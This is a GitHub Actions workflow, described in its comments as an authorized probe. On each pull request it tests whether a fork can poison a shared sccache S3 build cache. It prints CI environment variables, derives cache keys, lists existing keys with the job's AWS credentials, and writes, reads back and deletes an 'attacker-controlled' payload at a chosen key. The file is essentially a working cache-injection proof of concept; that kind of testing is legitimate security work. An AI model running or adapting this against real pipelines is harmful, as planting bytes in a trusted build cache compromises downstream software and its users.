name: zz-sccache-probe

# Authorized assessment probe (radkawar, owner consent).
# Answers: with write access to the sccache S3 bucket, can a fork PR inject a
# cache entry a TRUSTED build will consume?
#   1. is the sccache cache key derivable/observable from the job?
#   2. can we write arbitrary bytes at a cache key of our choosing, in the same
#      bucket trusted main/release builds read?
# Uses a throwaway key only; no existing entry is touched, marker is deleted.

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  sccache:
    name: cache-injection prereqs
    runs-on: omp-kata
    timeout-minutes: 10
    steps:
      - name: toolchain
        run: |
          set +e
          for t in sccache rustc cargo bazel bazelisk; do echo "$t=$(command -v "$t" || echo absent)"; done
          sccache --version 2>&1 | head -2
          env | grep -iE '^(SCCACHE|RUSTC_WRAPPER|CARGO_)[A-Za-z_]*=' | sort
          exit 0

      - name: key derivation and arbitrary-key write into the trusted build cache
        run: |
          set +e
          EP="${SCCACHE_ENDPOINT:-}"; BK="${SCCACHE_BUCKET:-sccache}"; URL="http://$EP/$BK"
          SIG=(--aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY")
          mkdir -p /tmp/k
          printf 'pub fn probe_%s() -> u32 { 7 }\n' "$GITHUB_RUN_ID" > /tmp/k/lib.rs

          echo "=== 1. derive a cache key for a throwaway TU (debug log) ==="
          SCCACHE_LOG=sccache=debug SCCACHE_ERROR_LOG=/tmp/k/err.log \
            sccache rustc --crate-type=lib --emit=obj -o /tmp/k/lib.o /tmp/k/lib.rs > /tmp/k/out.log 2>&1
          echo "sccache exit=$?"
          grep -ihoE '(cache )?key[=: ]+[0-9a-f]{20,}' /tmp/k/err.log /tmp/k/out.log 2>/dev/null | head -5
          echo "(no key printed => sccache binary absent in this image)"

          echo "=== 2. existing object keys in the trusted build cache (metadata only) ==="
          curl -sS --max-time 15 "${SIG[@]}" "$URL?list-type=2&max-keys=5" \
            | sed -n 's:.*<Key>\([^<]*\)</Key>.*:existing-key=\1:p' | head -5

          echo "=== 3. write attacker bytes at a key we choose, read back, clean up ==="
          K="probe-radkawar-key-${GITHUB_RUN_ID}"
          printf 'ATTACKER-CONTROLLED-CACHE-PAYLOAD\n' > /tmp/k/payload
          code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 -X PUT \
            --data-binary @/tmp/k/payload "${SIG[@]}" "$URL/$K")
          echo "PUT $K -> HTTP $code"
          curl -sS -o /tmp/k/got --max-time 15 "${SIG[@]}" "$URL/$K"
          echo "GET $K -> sha256=$(sha256sum /tmp/k/got | cut -d' ' -f1) expected=$(sha256sum /tmp/k/payload | cut -d' ' -f1)"
          code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 -X DELETE "${SIG[@]}" "$URL/$K")
          echo "DELETE $K -> HTTP $code"
          exit 0
